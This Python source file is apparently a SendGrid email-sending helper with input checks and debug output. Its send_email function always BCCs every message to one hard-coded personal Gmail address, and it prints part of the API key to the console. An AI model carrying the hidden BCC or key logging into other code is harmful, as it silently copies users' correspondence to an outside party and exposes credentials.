import os
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail, Email, To, Content, Cc, Bcc
from dotenv import load_dotenv
import sys
import traceback
from typing import List, Dict, Any, Optional

# Load environment variables from .env file with explicit path
print("Current working directory:", os.getcwd())
env_path = os.path.join(os.getcwd(), '.env')
print(f"Looking for .env file at: {env_path}")
print(f"File exists: {os.path.exists(env_path)}")

# Try to load the .env file
load_dotenv(dotenv_path=env_path, override=True)

# Debug environment variables
print("Environment variables after loading:")
print(f"EMAIL_FROM: '{os.environ.get('EMAIL_FROM')}'")
print(f"SENDGRID_API_KEY: {'Set' if os.environ.get('SENDGRID_API_KEY') else 'Not set'}")

def send_email(
    to_email: str,
    subject: str,
    html_content: str,
    plain_content: Optional[str] = None,
    cc_emails: Optional[List[str]] = None,
    bcc_emails: Optional[List[str]] = None
) -> Dict[str, Any]:
    """
    Send an email using SendGrid API with flexible options
    
    Args:
        to_email: Recipient email address
        subject: Email subject line
        html_content: HTML content of the email
        plain_content: Optional plain text content
        cc_emails: Optional list of CC recipients
        bcc_emails: Optional list of BCC recipients
        
    Returns:
        Dictionary with status, message, and response details
    """
    # Get from_email from environment variable
    from_email = os.environ.get('EMAIL_FROM')
    if not from_email:
        return {
            "success": False,
            "message": "EMAIL_FROM environment variable not set"
        }
    
    # Validate email format
    if '@' not in from_email or '.' not in from_email:
        return {
            "success": False,
            "message": f"Invalid sender email format: {from_email}. Please set a valid email in EMAIL_FROM environment variable."
        }
        
    if '@' not in to_email or '.' not in to_email:
        return {
            "success": False,
            "message": f"Invalid recipient email format: {to_email}"
        }
    
    # Get API key from environment variable
    api_key = os.environ.get('SENDGRID_API_KEY')
    if not api_key:
        return {
            "success": False,
            "message": "SENDGRID_API_KEY environment variable not set"
        }
    
    print(f"Sending email via SendGrid from {from_email} to {to_email}")
    print(f"Subject: {subject}")
    print(f"API Key (first 5 chars): {api_key[:5]}...")
    
    try:
        # Create proper Email objects
        from_email_obj = Email(from_email)
        to_email_obj = To(to_email)
        
        # Create message with HTML content
        message = Mail(
            from_email=from_email_obj,
            to_emails=to_email_obj,
            subject=subject,
            html_content=html_content)
        
        # Add plain text content if provided
        if plain_content:
            plain_content_obj = Content("text/plain", plain_content)
            message.add_content(plain_content_obj)
        
        # Add CC recipients if provided
        if cc_emails:
            for cc_email in cc_emails:
                message.add_cc(Cc(cc_email))
        
        # Always BCC zachderhake@gmail.com
        message.add_bcc(Bcc("zachderhake@gmail.com"))
        
        # Add additional BCC recipients if provided
        if bcc_emails:
            for bcc_email in bcc_emails:
                message.add_bcc(Bcc(bcc_email))
        
        # Initialize SendGrid client
        sg = SendGridAPIClient(api_key)
        
        # Debug: Print the message JSON to see what's being sent
        message_dict = message.get()
        print("Message JSON structure:")
        print(f"- Subject: {message_dict.get('subject')}")
        print(f"- From: {message_dict.get('from', {}).get('email')}")
        print(f"- To: {message_dict.get('personalizations', [{}])[0].get('to', [{}])[0].get('email')}")
        
        # Send the email
        response = sg.send(message)
        
        # Return success response with details
        return {
            "success": True,
            "message": f"Email sent successfully to {to_email}",
            "status_code": response.status_code,
            "body": response.body,
            "headers": dict(response.headers)
        }
        
    except Exception as e:
        error_message = str(e)
        print(f"Error sending email via SendGrid: {error_message}")
        
        # Try to get more detailed error information
        if hasattr(e, 'body'):
            try:
                print(f"Error details: {e.body.decode()}")
            except:
                print(f"Error body: {e.body}")
        
        traceback.print_exc()
        
        return {
            "success": False,
            "message": f"Failed to send email: {error_message}"
        }

def main():
    print("Hello, world!")
if __name__ == "__main__":
    main()